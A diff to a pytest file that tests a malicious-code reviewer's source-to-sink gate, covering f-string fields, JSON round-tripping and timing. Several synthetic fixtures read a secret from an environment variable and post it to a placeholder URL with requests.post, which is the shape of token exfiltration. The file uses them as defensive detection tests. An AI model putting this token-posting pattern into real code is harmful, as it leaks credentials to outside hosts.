@@ -1,6 +1,7 @@
 """Spec F §3.3: a malicious verdict stands only on a quoted chain the shown code contains. Synthetic only."""
 import dataclasses
 import json
+import time
 
 import pytest
 
@@ -493,3 +494,52 @@ def test_a_multiline_bytes_constant_counts_as_a_string():
 
 def test_the_fixture_chain_still_passes_after_fix_round_4():
     assert chain.gate(_v(), chains.SHOWN) == ""
+
+
+# ---- Fix round 5 (controller rulings G1-G2) ----
+
+_TOKEN_SRC = 'import os, requests\nTOKEN = os.getenv("K")\n' + "pass\n" * 80
+
+
+def test_a_hop_through_an_f_string_field_line_connects():
+    # G1: the code inside `{...}` of a multi-line f-string is real code, not string content.
+    text = _TOKEN_SRC + 'def h():\n    msg = f"""report\n{TOKEN}\n"""\n    requests.post(U, data=msg)\n'
+    v = _v(chain_source='TOKEN = os.getenv("K")', chain_sink="requests.post(U, data=msg)")
+    shown = _shown("pkg/a.py", text, cls="runtime-call")
+    assert shown["pkg/a.py"]["strings"] == [86] and shown["pkg/a.py"]["fields"] == {85: "TOKEN"}
+    assert chain.gate(v, shown) == ""
+
+
+def test_a_sink_opening_an_f_string_whose_field_reads_the_source_connects():
+    text = _TOKEN_SRC + 'def h():\n    requests.post(U, json={"a": f"""\n{TOKEN}\n"""})\n'
+    v = _v(chain_source='TOKEN = os.getenv("K")', chain_sink='requests.post(U, json={"a": f"""')
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_only_the_field_code_of_an_f_string_line_is_read():
+    # G1: `token` in the literal text of a field line is still string content; only `user` is read there.
+    text = ('import os, requests\ndef g():\n    token = os.getenv("K")\n    return 1\n' + "pass\n" * 80
+            + 'def h(user):\n    msg = f"""hi\n'
+            + 'please {user:>{w}} forget your token\n"""\n    requests.post(U, json=msg)\n')
+    shown = _shown("pkg/a.py", text, cls="runtime-call")
+    assert shown["pkg/a.py"]["fields"] == {87: "user w"}
+    v = _v(chain_source='token = os.getenv("K")', chain_sink="requests.post(U, json=msg)")
+    assert chain.gate(v, shown) == "no dataflow shown between source and sink"
+
+
+def test_fields_round_trip_through_json():
+    text = _TOKEN_SRC + 'def h():\n    msg = f"""report\n{TOKEN}\n"""\n'
+    shown = _shown("pkg/a.py", text)
+    assert reviewer.shown_from_json(reviewer.shown_to_json(shown)) == shown
+
+
+@pytest.mark.parametrize("text", [
+    "x = [" + ",".join(f'"s{i}é"' for i in range(32_000)) + "]\n",
+    ";".join(f'"s{i}é"' for i in range(32_000)) + "\n",
+], ids=["one-line-list", "bare-expressions"])
+def test_many_strings_on_one_long_line_map_in_linear_time(text):
+    # G2: mapping ast positions onto shown lines must not rescan the line per string (was ~20 s each).
+    t0 = time.perf_counter()
+    entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], text), "runtime-call", whole=True)
+    assert time.perf_counter() - t0 < 2.0
+    assert entry["lines"] == {1: text[:-1]}
